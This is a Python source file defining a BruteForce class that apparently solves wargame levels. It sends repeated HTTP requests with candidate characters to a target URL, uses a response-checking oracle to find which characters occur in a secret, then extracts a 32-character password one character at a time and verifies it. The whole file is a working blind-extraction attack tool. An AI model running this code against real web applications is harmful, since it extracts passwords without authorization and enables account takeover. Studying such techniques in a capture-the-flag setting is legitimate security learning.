from .utils import write, check_pass

import string
import requests


class BruteForce(object):


    def __init__(self, url, letters=None):
        self.level_url = url

        if letters:
            self.available_letters = letters
        else:
            self.available_letters = string.ascii_letters + string.digits

        self.letter_params = None
        self.letter_check_fn = None

        self.crack_params = None
        self.crack_check_fn = None
        self.pass_len = None
        
    def letters_setup(self, params, check_fn):
        self.letter_params = params
        self.letter_check_fn = check_fn

    def get_letters(self):
        if not all ([self.letter_params, self.letter_check_fn]):
            raise Exception("You need to first setup the params and check_fn!")

        url = self.level_url + "?" + self.letter_params

        write("Getting available letters")

        write_index = 0
        key_letters = []
        for letter in self.available_letters:
            response = requests.get(url.format(letter))
            if self.letter_check_fn(response):
                key_letters.append(letter)

            write(".")
            write_index += 1

            if write_index == 3:
                write_index = 0
                write(3 * "\b" + 3 * " " + 3 * "\b")

        write(write_index * "\b" + 3 * "." + " Done!")
        write("\nThe key letters are : {}".format("".join(key_letters)))

        return key_letters

    def crack_setup(self, params, check_fn, pass_len=32):
        self.crack_params = params
        self.crack_check_fn = check_fn
        self.pass_len = pass_len

    def crack_key(self, letters):
        if not all([self.crack_params, self.crack_check_fn, self.pass_len]):
            raise Exception("You need to first setup the params and check_fn!")

        password = ""

        url = self.level_url + "?" + self.crack_params

        write("\nCracking password : " 
              + self.pass_len * "_" 
              + self.pass_len * "\b")

        while(len(password) != self.pass_len):
            for letter in letters:
                response = requests.get(url.format(password + letter))
                if self.crack_check_fn(response):
                    password += letter

                    write(letter)

        return password

    def check_setup(self, url, user):
        self.check_url = url
        self.check_user = user

    def check(self, key):
        if not all([self.check_url, self.check_user]):
            raise Exception("You need to first setup the url and user!")

        write(check_pass(self.check_url, self.check_user, key))

    def crack_it(self):
        letters = self.get_letters()
        key = self.crack_key(letters)
        self.check(key)

    def prepare(self):
        raise Exception("You need to implement this method!")
